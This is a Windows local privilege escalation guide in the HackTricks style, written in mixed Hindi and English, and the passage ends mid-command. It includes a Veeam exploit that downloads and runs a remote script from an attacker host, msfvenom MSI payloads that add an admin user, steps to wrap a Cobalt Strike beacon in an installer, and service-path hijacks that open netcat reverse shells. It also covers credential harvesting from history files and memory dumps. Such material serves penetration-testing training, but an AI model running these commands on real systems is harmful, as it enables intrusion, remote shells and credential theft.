# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Best tool to look for Windows local privilege escalation vectors:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## प्रारंभिक Windows सिद्धांत

### Access Tokens

**यदि आप नहीं जानते कि Windows Access Tokens क्या हैं, तो जारी रखने से पहले निम्नलिखित पृष्ठ पढ़ें:**

{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**ACLs - DACLs/SACLs/ACEs के बारे में अधिक जानकारी के लिए निम्नलिखित पृष्ठ देखें:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**यदि आप नहीं जानते कि Windows में integrity levels क्या होते हैं तो जारी रखने से पहले निम्नलिखित पृष्ठ पढ़ना चाहिए:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows सुरक्षा नियंत्रण

Windows में ऐसी कई चीज़ें हैं जो आपको सिस्टम की enumeration से रोक सकती हैं, executables चलाने से रोक सकती हैं या यहाँ तक कि आपकी गतिविधियों का पता लगा सकती हैं। आपको ये सभी defense mechanisms पढ़कर और enumerate करके समझना चाहिए इससे पहले कि आप privilege escalation enumeration शुरू करें:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

### Admin Protection / UIAccess silent elevation

UIAccess processes जो `RAiLaunchAdminProcess` के माध्यम से लॉन्च होते हैं, उनका दुरुपयोग करके AppInfo secure-path checks bypass होने पर बिना prompts के High IL तक पहुंचा जा सकता है। समर्पित UIAccess/Admin Protection bypass workflow यहाँ देखें:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

## सिस्टम जानकारी

### Version info enumeration

जाँचें कि Windows version में कोई ज्ञात vulnerability है या नहीं (लागू पैच भी जाँचें)।
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Version Exploits

This [site](https://msrc.microsoft.com/update-guide/vulnerability) Microsoft security vulnerabilities के बारे में विस्तृत जानकारी खोजने के लिए उपयोगी है। इस डेटाबेस में 4,700 से अधिक security vulnerabilities हैं, जो Windows environment द्वारा प्रस्तुत **massive attack surface** को दिखाती हैं।

**On the system**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas has watson embedded)_

**Locally with system information**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github repos of exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Environment

क्या कोई credential/Juicy जानकारी env variables में संग्रहीत है?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell इतिहास
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell ट्रांसक्रिप्ट फ़ाइलें

इसे कैसे चालू करें, आप इस लिंक पर जान सकते हैं: [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

PowerShell पाइपलाइन के निष्पादन का विवरण रिकॉर्ड किया जाता है, जिसमें निष्पादित कमांड, कमांड इनवोकेशन्स और स्क्रिप्ट के हिस्से शामिल होते हैं। हालांकि, पूर्ण निष्पादन विवरण और आउटपुट परिणाम कैद नहीं हो सकते।

इसे सक्षम करने के लिए, डॉक्यूमेंटेशन के "Transcript files" सेक्शन में दिए निर्देशों का पालन करें, और **"Module Logging"** को **"Powershell Transcription"** के बजाय चुनें।
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
PowersShell logs से अंतिम 15 घटनाएँ देखने के लिए आप निम्नलिखित कमांड चला सकते हैं:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

स्क्रिप्ट के निष्पादन की पूरी गतिविधि और सामग्री का पूरा रिकॉर्ड कैप्चर किया जाता है, जिससे यह सुनिश्चित होता है कि कोड का हर ब्लॉक चलते समय दस्तावेजीकृत होता है। यह प्रक्रिया प्रत्येक गतिविधि का एक व्यापक ऑडिट ट्रेल संरक्षित करती है, जो फॉरेंसिक और दुर्भावनापूर्ण व्यवहार के विश्लेषण के लिए मूल्यवान है। निष्पादन के समय सभी गतिविधियों को दस्तावेजीकृत करके, प्रक्रिया के बारे में विस्तृत अंतर्दृष्टि प्रदान की जाती है।
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Script Block के लिए लॉगिंग ईवेंट्स Windows Event Viewer में निम्न पथ पर स्थित होते हैं: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
अंतिम 20 ईवेंट देखने के लिए आप उपयोग कर सकते हैं:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### इंटरनेट सेटिंग्स
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### ड्राइव्स
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

यदि अपडेट्स http**S** के बजाय http के माध्यम से अनुरोधित किए जाते हैं तो आप सिस्टम को compromise कर सकते हैं।

आप यह जांच करना शुरू करते हैं कि नेटवर्क non-SSL WSUS update का उपयोग करता है या नहीं, इसके लिए cmd में निम्नलिखित चलाएँ:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
या PowerShell में निम्नलिखित:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
यदि आपको इनमें से किसी उत्तर जैसा जवाब मिलता है:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
And if `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` or `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` is equals to `1`.

Then, **it is exploitable.** If the last registry is equals to 0, then, the WSUS entry will be ignored.

In orther to exploit this vulnerabilities you can use tools like: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus)- These are MiTM weaponized exploits scripts to inject 'fake' updates into non-SSL WSUS traffic.

Read the research here:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Read the complete report here**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Basically, this is the flaw that this bug exploits:

> If we have the power to modify our local user proxy, and Windows Updates uses the proxy configured in Internet Explorer’s settings, we therefore have the power to run [PyWSUS](https://github.com/GoSecure/pywsus) locally to intercept our own traffic and run code as an elevated user on our asset.
>
> Furthermore, since the WSUS service uses the current user’s settings, it will also use its certificate store. If we generate a self-signed certificate for the WSUS hostname and add this certificate into the current user’s certificate store, we will be able to intercept both HTTP and HTTPS WSUS traffic. WSUS uses no HSTS-like mechanisms to implement a trust-on-first-use type validation on the certificate. If the certificate presented is trusted by the user and has the correct hostname, it will be accepted by the service.

You can exploit this vulnerability using the tool [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (once it's liberated).

## तृतीय-पक्ष Auto-Updaters और Agent IPC (local privesc)

Many enterprise agents expose a localhost IPC surface and a privileged update channel. If enrollment can be coerced to an attacker server and the updater trusts a rogue root CA or weak signer checks, a local user can deliver a malicious MSI that the SYSTEM service installs. See a generalized technique (based on the Netskope stAgentSvc chain – CVE-2025-0309) here:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM via TCP 9401)

Veeam B&R < `11.0.1.1261` exposes a localhost service on **TCP/9401** that processes attacker-controlled messages, allowing arbitrary commands as **NT AUTHORITY\SYSTEM**.

- **Recon**: confirm the listener and version, e.g., `netstat -ano | findstr 9401` and `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.
- **Exploit**: place a PoC such as `VeeamHax.exe` with the required Veeam DLLs in the same directory, then trigger a SYSTEM payload over the local socket:
```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```
The service executes the command as SYSTEM.

## KrbRelayUp

Windows **domain** environments में विशिष्ट परिस्थितियों के तहत एक **local privilege escalation** vulnerability मौजूद है। इन परिस्थितियों में वे environment शामिल हैं जहाँ **LDAP signing is not enforced,** उपयोगकर्ताओं के पास self-rights होते हैं जो उन्हें **Resource-Based Constrained Delegation (RBCD)** कॉन्फ़िगर करने की अनुमति देते हैं, तथा उपयोगकर्ताओं के पास domain में कंप्यूटर बनाने की क्षमता होती है। यह ध्यान देने योग्य है कि ये **requirements** **default settings** का उपयोग करके पूरी हो जाती हैं।

Find the **exploit in** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

For more information about the flow of the attack check [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**यदि** ये 2 registers **enabled** (value is **0x1**) हैं, तो किसी भी privilege वाले उपयोगकर्ता NT AUTHORITY\\**SYSTEM** के रूप में `*.msi` फ़ाइलें **install** (execute) कर सकते हैं।
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
यदि आपके पास एक meterpreter session है, तो आप इस technique को module **`exploit/windows/local/always_install_elevated`** का उपयोग करके automate कर सकते हैं।

### PowerUP

`Write-UserAddMSI` command का उपयोग power-up से करें ताकि वर्तमान directory के अंदर एक Windows MSI बाइनरी बनाई जा सके जो privileges escalate करे। यह script एक precompiled MSI installer लिखता है जो user/group addition के लिए prompt करता है (इसलिए आपको GIU access की आवश्यकता होगी):
```
Write-UserAddMSI
```
केवल बनाए गए बाइनरी को चलाएँ ताकि privileges बढ़ जाएँ।

### MSI Wrapper

इस ट्यूटोरियल को पढ़ें ताकि आप सीख सकें कि इन टूल्स का उपयोग करके MSI wrapper कैसे बनाया जाता है। ध्यान दें कि आप "**.bat**" फ़ाइल को रैप कर सकते हैं अगर आप **just** केवल **execute** **command lines** करना चाहते हैं


{{#ref}}
msi-wrapper.md
{{#endref}}

### WIX के साथ MSI बनाना


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Visual Studio के साथ MSI बनाना

- **Generate** Cobalt Strike या Metasploit के साथ एक **new Windows EXE TCP payload** को `C:\privesc\beacon.exe` में रखें
- **Visual Studio** खोलें, **Create a new project** चुनें और खोज बॉक्स में "installer" टाइप करें। **Setup Wizard** प्रोजेक्ट चुनें और **Next** पर क्लिक करें।
- प्रोजेक्ट को एक नाम दें, जैसे **AlwaysPrivesc**, लोकेशन के लिए **`C:\privesc`** का उपयोग करें, **place solution and project in the same directory** चुनें, और **Create** पर क्लिक करें।
- तब तक **Next** पर क्लिक करते रहें जब तक आप 4 में से स्टेप 3 (choose files to include) पर नहीं पहुँचते। **Add** पर क्लिक करें और अभी जो Beacon payload आपने जनरेट किया है उसे चुनें। फिर **Finish** पर क्लिक करें।
- **Solution Explorer** में **AlwaysPrivesc** प्रोजेक्ट को हाईलाइट करें और **Properties** में **TargetPlatform** को **x86** से **x64** में बदलें।
- अन्य properties भी बदल सकते हैं, जैसे **Author** और **Manufacturer**, जो इंस्टॉल किए गए ऐप को अधिक वैध दिखा सकते हैं।
- प्रोजेक्ट पर राइट-क्लिक करें और **View > Custom Actions** चुनें।
- **Install** पर राइट-क्लिक करें और **Add Custom Action** चुनें।
- **Application Folder** पर डबल-क्लिक करें, अपनी **beacon.exe** फ़ाइल चुनें और **OK** पर क्लिक करें। इससे सुनिश्चित होगा कि installer रन होते ही beacon payload चल जाएगा।
- **Custom Action Properties** के अंतर्गत **Run64Bit** को **True** में बदलें।
- अंत में, **build it**।
- यदि चेतावनी `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` दिखाई दे, तो सुनिश्चित करें कि आपने platform को x64 पर सेट किया है।

### MSI इंस्टॉलेशन

मैलिशियस `.msi` फ़ाइल की **installation** को **background** में execute करने के लिए:
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
To exploit this vulnerability you can use: _exploit/windows/local/always_install_elevated_

## एंटीवायरस और डिटेक्टर्स

### ऑडिट सेटिंग्स

ये सेटिंग्स तय करती हैं कि क्या **लॉग** किया जा रहा है, इसलिए आपको ध्यान देना चाहिए।
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding — यह जानना रोचक है कि logs कहाँ भेजे जाते हैं
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** को **local Administrator passwords के प्रबंधन** के लिए डिज़ाइन किया गया है, यह सुनिश्चित करते हुए कि domain से जुड़े कंप्यूटरों पर प्रत्येक पासवर्ड **अनूठा, यादृच्छिक और नियमित रूप से अपडेट किया जाता है**। ये पासवर्ड Active Directory में सुरक्षित रूप से संग्रहीत होते हैं और केवल उन्हीं उपयोगकर्ताओं द्वारा एक्सेस किए जा सकते हैं जिन्हें ACLs के माध्यम से पर्याप्त अनुमतियाँ दी गई हों, जिससे वे अधिकृत होने पर local admin passwords देख सकें।

{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

यदि सक्रिय है, तो **plain-text passwords LSASS में संग्रहीत होते हैं** (Local Security Authority Subsystem Service).\
[**WDigest के बारे में अधिक जानकारी इस पृष्ठ पर**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

**Windows 8.1** से शुरू होकर, Microsoft ने Local Security Authority (LSA) के लिए सुरक्षा बढ़ाई है ताकि untrusted processes द्वारा इसके मेमोरी को **read its memory** करने या कोड inject करने के प्रयासों को **block** किया जा सके, और सिस्टम और सुरक्षित रहे.\
[**More info about LSA Protection here**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** को **Windows 10** में पेश किया गया था। इसका उद्देश्य डिवाइस पर संग्रहीत credentials को pass-the-hash जैसे खतरों से सुरक्षित रखना है.| [**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Cached Credentials

**Domain credentials** को **Local Security Authority** (LSA) द्वारा प्रमाणित किया जाता है और ऑपरेटिंग सिस्टम के घटकों द्वारा उपयोग किया जाता है। जब किसी उपयोगकर्ता के लॉगऑन डेटा को किसी registered security package द्वारा प्रमाणित किया जाता है, तो आम तौर पर उस उपयोगकर्ता के लिए domain credentials स्थापित किए जाते हैं।\
[**More info about Cached Credentials here**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## उपयोगकर्ता और समूह

### उपयोगकर्ताओं और समूहों को सूचीबद्ध करें

आपको यह जांचना चाहिए कि जिन समूहों का आप हिस्सा हैं, उनमें किसी के पास कोई दिलचस्प permissions तो नहीं हैं।
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### विशेषाधिकार समूह

यदि आप **किसी विशेषाधिकार समूह के सदस्य हैं तो आप privileges escalate करने में सक्षम हो सकते हैं**। विशेषाधिकार समूहों और इन्हें दुरुपयोग करके privileges escalate करने के बारे में यहाँ जानें:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### टोकन हेरफेर

**और अधिक जानें** कि इस पृष्ठ पर **token** क्या है: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
निम्नलिखित पृष्ठ देखें ताकि आप **दिलचस्प tokens के बारे में जानें** और उन्हें दुरुपयोग कैसे किया जा सकता है:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### लॉग इन उपयोगकर्ता / सत्र
```bash
qwinsta
klist sessions
```
### होम फ़ोल्डर्स
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### पासवर्ड नीति
```bash
net accounts
```
### क्लिपबोर्ड की सामग्री प्राप्त करें
```bash
powershell -command "Get-Clipboard"
```
## चल रही प्रक्रियाएँ

### फ़ाइल और फ़ोल्डर अनुमतियाँ

सबसे पहले, प्रक्रियाओं की सूची बनाते समय **प्रक्रिया की command line के अंदर पासवर्ड की जाँच करें**.\
जाँच करें कि क्या आप किसी चल रहे binary को **overwrite some binary running** कर सकते हैं या binary फ़ोल्डर पर आपकी write permissions हैं ताकि संभावित [**DLL Hijacking attacks**](dll-hijacking/index.html) का exploit कर सकें:
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
हमेशा यह जाँच करें कि कोई [**electron/cef/chromium debuggers** चल तो नहीं रहे हैं; आप उनका दुरुपयोग करके privileges escalate कर सकते हैं](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**processes binaries के permissions की जाँच**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**प्रोसेस बाइनरीज़ के फ़ोल्डरों की अनुमतियों की जाँच (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### मेमोरी पासवर्ड माइनिंग

आप चल रहे प्रोसेस का मेमोरी डंप बनाने के लिए **procdump** from sysinternals का उपयोग कर सकते हैं। FTP जैसी सेवाओं में मेमोरी में **credentials in clear text in memory** होते हैं; मेमोरी डंप करके उन credentials को पढ़ने की कोशिश करें।
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### असुरक्षित GUI ऐप्स

**SYSTEM के रूप में चलने वाले applications अक्सर उपयोगकर्ता को CMD लॉन्च करने या निर्देशिकाएँ ब्राउज़ करने की अनुमति दे सकते हैं।**

उदाहरण: "Windows Help and Support" (Windows + F1), "command prompt" खोजें, "Click to open Command Prompt" पर क्लिक करें

## Services

Service Triggers Windows को तब एक service शुरू करने देते हैं जब कुछ शर्तें पूरी हों (named pipe/RPC endpoint activity, ETW events, IP availability, device arrival, GPO refresh, आदि)। SERVICE_START rights के बिना भी आप अक्सर privileged services को उनके triggers चलाकर शुरू कर सकते हैं। enumeration और activation तकनीकों के लिए यहाँ देखें:

-
{{#ref}}
service-triggers.md
{{#endref}}

Services की सूची प्राप्त करें:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### अनुमतियाँ

आप किसी service की जानकारी प्राप्त करने के लिए **sc** का उपयोग कर सकते हैं।
```bash
sc qc <service_name>
```
प्रत्येक सेवा के लिए आवश्यक privilege स्तर की जांच के लिए _Sysinternals_ का binary **accesschk** होना सुझाया जाता है।
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
सुझाया जाता है कि यह जाँचें कि "Authenticated Users" किसी भी सेवा को संशोधित कर सकते हैं:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[आप यहाँ accesschk.exe (XP के लिए) डाउनलोड कर सकते हैं](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### सेवा सक्षम करें

यदि आपको यह त्रुटि हो रही है (उदाहरण के लिए SSDPSRV के साथ):

_System error 1058 has occurred._\
_The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._

आप इसे सक्षम करने के लिए निम्न का उपयोग कर सकते हैं:
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**ध्यान रखें कि सेवा upnphost काम करने के लिए SSDPSRV पर निर्भर करती है (for XP SP1)**

**इस समस्या का एक और workaround** यह चलाना है:
```
sc.exe config usosvc start= auto
```
### **सर्विस बाइनरी पाथ बदलें**

उस स्थिति में जहाँ "Authenticated users" समूह के पास किसी service पर **SERVICE_ALL_ACCESS** हो, सेवा के executable बाइनरी में बदलाव करना संभव है। इसे बदलने और **sc** चलाने के लिए:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### सेवा पुनरारंभ करें
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Privileges can be escalated through various permissions:

- **SERVICE_CHANGE_CONFIG**: सेवा बाइनरी को री-कॉन्फ़िगर करने की अनुमति देता है।
- **WRITE_DAC**: अनुमतियों (permissions) को पुनः कॉन्फ़िगर करने में सक्षम बनाता है, जिससे service configurations बदलने की क्षमता मिलती है।
- **WRITE_OWNER**: Ownership हासिल करने और अनुमतियों को पुनः कॉन्फ़िगर करने की अनुमति देता है।
- **GENERIC_WRITE**: service configurations बदलने की क्षमता विरासत में मिलती है।
- **GENERIC_ALL**: यह भी service configurations बदलने की क्षमता शामिल करता है।

For the detection and exploitation of this vulnerability, the _exploit/windows/local/service_permissions_ can be utilized.

### Services binaries weak permissions

**जाँचें कि क्या आप उस बाइनरी को संशोधित कर सकते हैं जिसे कोई service execute कर रहा है** या क्या आपके पास उस फोल्डर पर **write permissions** हैं जहाँ बाइनरी स्थित है ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
You can get every binary that is executed by a service using **wmic** (not in system32) and check your permissions using **icacls**:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
आप **sc** और **icacls** का भी उपयोग कर सकते हैं:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### Services registry modify permissions

आपको यह जांचना चाहिए कि क्या आप किसी भी service registry को संशोधित कर सकते हैं।\
आप एक service registry पर अपनी **permissions** **check** कर सकते हैं इस तरह:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
यह जांचना चाहिए कि क्या **Authenticated Users** या **NT AUTHORITY\INTERACTIVE** के पास `FullControl` permissions हैं। यदि हाँ, तो service द्वारा execute होने वाला binary बदल दिया जा सकता है।

Execute होने वाले binary के Path को बदलने के लिए:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Services registry AppendData/AddSubdirectory permissions

यदि आपके पास किसी registry पर यह permission है तो इसका मतलब है कि **आप इस registry से sub registries बना सकते हैं**। Windows services के मामले में यह **मनमाना कोड निष्पादित करने के लिए पर्याप्त है:**

{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

यदि किसी executable का path quotes के अंदर नहीं है, तो Windows स्पेस से पहले के प्रत्येक संभावित path को चलाने की कोशिश करेगा।

For example, for the path _C:\Program Files\Some Folder\Service.exe_ Windows will try to execute:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
सभी unquoted service paths सूचीबद्ध करें, उन सेवाओं को छोड़कर जो built-in Windows services से संबंधित हैं:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
